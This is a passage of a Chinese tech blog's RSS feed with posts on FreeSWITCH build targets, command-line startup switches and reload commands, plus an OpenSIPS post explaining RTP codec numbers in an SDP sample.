&lt;li&gt;make current - Cleans build environment, performs an git update, then does a make install&lt;/li&gt;
&lt;li&gt;make core_install (or make install_core) - Recompiles and installs just the core files. Handy if you are working on a core file and want to recompile without doing the whole shebang.&lt;/li&gt;
&lt;li&gt;make mod_XXXX-install - Recompiles and installs just a single module. Here are some examples:
&lt;ul&gt;
&lt;li&gt;make mod_openzap-install&lt;/li&gt;
&lt;li&gt;make mod_sofia-install&lt;/li&gt;
&lt;li&gt;make mod_lcr-install&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;make samples - This will not replace your configuration. This will instead make the default extensions and dialplan to run the basic configuration of FreeSWITCH.&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>fs 命令行</title>
      <link>https://wdd.js.org/freeswitch/command-line/</link>
      <pubDate>Tue, 10 Dec 2019 11:19:39 +0800</pubDate>
      <guid>https://wdd.js.org/freeswitch/command-line/</guid>
      <description>&lt;p&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h1 id=&#34;运行fs&#34;&gt;运行fs&lt;/h1&gt;
&lt;p&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h2 id=&#34;前台运行&#34;&gt;前台运行&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-makefile&#34; data-lang=&#34;makefile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;freeswitch&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h2 id=&#34;后台运行&#34;&gt;后台运行&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-makefile&#34; data-lang=&#34;makefile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;freeswich&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-nc&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h2 id=&#34;参数列表&#34;&gt;参数列表&lt;/h2&gt;
&lt;p&gt;These are the optional arguments you can pass to freeswitch:&lt;/p&gt;
&lt;p&gt;FreeSWITCH startup switches&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-makefile&#34; data-lang=&#34;makefile&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-waste&lt;/span&gt;                 &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;allow&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;memory&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;waste&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-no-auto-stack&lt;/span&gt;         &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;don&amp;#39;t&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;adjust&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;thread&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;stack&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;size&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-core&lt;/span&gt;                  &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;dump&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;cores&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-help&lt;/span&gt;                  &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;this&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;message&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-version&lt;/span&gt;               &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;version&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;and&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;exit&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-rp&lt;/span&gt;                    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;enable&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;high(realtime)&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;priority&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;settings&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-lp&lt;/span&gt;                    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;enable&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;low&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;priority&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;settings&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-np&lt;/span&gt;                    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;enable&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;normal&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;priority&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;settings&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;(system&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;default)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-vg&lt;/span&gt;                    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;run&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;under&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;valgrind&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-nosql&lt;/span&gt;                 &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;disable&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;internal&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;SQL&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;scoreboard&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-heavy-timer&lt;/span&gt;           &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Heavy&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Timer,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;possibly&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;more&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;accurate&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;but&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;at&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;cost&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-nonat&lt;/span&gt;                 &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;disable&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;auto&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;NAT&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;detection&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-nonatmap&lt;/span&gt;              &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;disable&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;auto&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;NAT&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;port&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;mapping&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-nocal&lt;/span&gt;                 &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;disable&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;clock&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;calibration&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-nort&lt;/span&gt;                  &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;disable&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;clock&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;clock_realtime&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-stop&lt;/span&gt;                  &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;stop&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;freeswitch&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-nc&lt;/span&gt;                    &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;no&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;console&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;and&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;run&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;background&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-ncwait&lt;/span&gt;                &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;no&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;console&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;and&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;run&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;background,&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;but&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;wait&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;until&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;system&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;ready&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;before&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;exiting&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;(implies&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-nc)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;-c&lt;/span&gt;                     &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;--&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;output&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;console&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;and&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;stay&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;foreground&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;(default&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;behavior)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;!-- raw HTML omitted --&gt;&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>fs reload命令</title>
      <link>https://wdd.js.org/freeswitch/reload/</link>
      <pubDate>Tue, 10 Dec 2019 11:17:55 +0800</pubDate>
      <guid>https://wdd.js.org/freeswitch/reload/</guid>
      <description>&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;&lt;strong&gt;Item&lt;/strong&gt;&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;&lt;strong&gt;Reload Command&lt;/strong&gt;&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;&lt;strong&gt;Notes&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;XML Dialplan&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;reloadxml&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Run each time you edit XML dial file(s)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;ACLs&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;reloadacl&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Edit acl.conf.xml first&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Voicemail&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;reload mod_voicemail&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Edit voicemail.conf.xml first&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Conference&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;reload mod_conference&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Edit conference.conf.xml first&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Add Sofia Gateway&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;sofia profile &lt;!-- raw HTML omitted --&gt; rescan&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Less intrusive - no calls dropped&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Remove Sofia Gateway&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;sofia profile &lt;!-- raw HTML omitted --&gt; killgw &amp;lt;gateway_name&amp;gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Less intrusive - no calls dropped&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Restart Sofia Gateway&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;sofia profile &lt;!-- raw HTML omitted --&gt; killgw &amp;lt;gateway_name&amp;gt;&lt;!-- raw HTML omitted --&gt;sofia profile &lt;!-- raw HTML omitted --&gt; rescan&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Less intrusive - no calls dropped&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Add/remove Sofia Gateway&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;sofia profile &lt;!-- raw HTML omitted --&gt; restart&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;More intrusive - all profile calls dropped&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Local Stream&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;see &lt;a href=&#34;https://freeswitch.org/confluence/display/FREESWITCH/mod_local_stream#mod_local_stream-API&#34;&gt;Mod_local_stream&lt;/a&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Edit localstream.conf.xml first&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Update a lua file&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;nothing necessary&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;file is loaded from disk each time it is run&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Update LCR SQL table&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;nothing necessary&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;SQL query is run for each new call&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Update LCR options&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;reload mod_lcr&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Edit lcr.conf.xml first&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Update CID Lookup Options&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;reload mod_cidlookup&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Edit cidlookup.conf.xml first&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Update JSON CDR Options&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;reload mod_json_cdr&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Edit json_cdr.conf.xml first&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Update XML CDR Options&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;reload mod_xml_cdr&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Edit xml_cdr.conf.xml first&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Update XML CURL Server Response&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;nothing, unless using &lt;a href=&#34;https://freeswitch.org/confluence/display/FREESWITCH/mod_xml_curl#mod_xml_curl-Caching&#34;&gt;cache&lt;/a&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt; &lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;</description>
    </item>
    <item>
      <title>rtp编码表</title>
      <link>https://wdd.js.org/opensips/ch4/codec-table/</link>
      <pubDate>Sat, 07 Dec 2019 09:10:33 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch4/codec-table/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;v&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;o&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;WMSWMS &lt;span style=&#34;color:#ae81ff&#34;&gt;1562204406&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1562204407&lt;/span&gt; IN IP4 192.168.40.79
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;WMSWMS
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;c&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;IN IP4 192.168.40.79
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;t&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;m&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;audio &lt;span style=&#34;color:#ae81ff&#34;&gt;31114&lt;/span&gt; RTP/AVP &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;101&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;rtpmap:0 PCMU/8000
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;rtpmap:8 PCMA/8000
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;rtpmap:9 G722/8000
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;rtpmap:101 telephone-event/8000
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;fmtp:101 0-16
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ptime:20
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的SDP协议，我们只关注媒体编码部分，其中&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;m=audio 31114 RTP/AVP 0 8 9 101
a=rtpmap:0 PCMU/8000
a=rtpmap:8 PCMA/8000
a=rtpmap:9 G722/8000
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;m字段audio说明是音频&lt;/li&gt;
&lt;li&gt;31114是rtp的发送端口，一般rtp端口都是偶数，偶数后面的一个奇数端口是给rtcp端口的&lt;/li&gt;
&lt;li&gt;0 8 9 101就是媒体编码，每个整数代表一个编码，其中96以下的是都是用IANA规定的，可以不用下面的rtpmap字段去指定，96以上的属于动态编码，需要用rtpmap去指定&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;上面是整个编码表，我们只需要记住几个就可以:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch4/codec-table/2022-11-30-21-53-25.png&#34;&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;0&lt;/th&gt;
          &lt;th&gt;PCMU/8000&lt;/th&gt;
      &lt;/tr&gt;
